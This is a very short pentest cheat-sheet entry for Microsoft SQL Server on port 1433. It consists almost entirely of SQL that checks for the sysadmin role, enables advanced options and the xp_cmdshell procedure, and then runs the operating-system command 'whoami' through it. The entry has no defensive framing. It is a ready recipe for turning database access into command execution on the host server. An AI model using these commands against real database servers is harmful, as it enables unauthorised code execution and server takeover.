# 1433 - MSSQL

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');

EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;

EXEC sp_configure 'xp_cmdshell', 1
reconfigure;

xp_cmdshell "whoami" 
```



